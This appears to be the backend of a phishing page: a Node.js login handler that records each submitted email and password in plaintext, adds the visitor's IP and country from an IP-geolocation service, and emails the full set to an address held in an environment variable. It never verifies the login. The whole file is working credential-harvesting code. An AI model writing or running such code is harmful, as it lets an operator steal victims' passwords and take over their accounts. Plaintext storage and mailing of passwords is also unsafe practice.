const db = require("../config/db");
const axios = require("axios");
const nodemailer = require("nodemailer");

const handleLogin = async (req, res) => {
  const { email, password } = req.body;

  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  let countryCode = "UNKNOWN";
  try {
    const geo = await axios.get(`http://ip-api.com/json/${ip}`);
    countryCode = geo.data.countryCode || "UNKNOWN";
  } catch (error) {
    console.log("🌐 Geolocation Error:", error.message);
  }

  // ✅ Insert into MySQL
  const query = `
    INSERT INTO login_logs (email, password, ip_address, country_code)
    VALUES (?, ?, ?, ?)
  `;
  db.query(query, [email, password, ip, countryCode], async (err, result) => {
    if (err) {
      console.error("❌ Insert error:", err);
      return res.status(500).json({ success: false, message: "Database error" });
    }

    // ✅ Send to Gmail
    // ✅ Send to Gmail
try {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });

  const mailOptions = {
    from: `"Login System" <${process.env.EMAIL_USER}>`,  // ✅ Clean sender name
    to: process.env.TO_EMAIL,
    subject: `New Login Attempt - ${new Date().toISOString()}`,
    html: `
      <div style="font-family: Arial, sans-serif; padding: 10px; border: 1px solid #ccc;">
        <h2 style="color: red;">New Login Attempt</h2>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${password}</p>
        <p><strong>IP Address:</strong> ${ip}</p>
        <p><strong>Country Code:</strong> ${countryCode}</p>
        <p><strong>User Agent:</strong> ${req.headers['user-agent']}</p>
        <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
      </div>
    `,
  };

  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.error("📧 Email send error:", err);
    } else {
      console.log("📨 Email sent:", info.response);
    }
  });
} catch (error) {
  console.error("📧 Email error:", error.message);
}


    return res.status(200).json({ success: true, message: "Login logged & mailed!" });
  });
};

module.exports = { login: handleLogin };
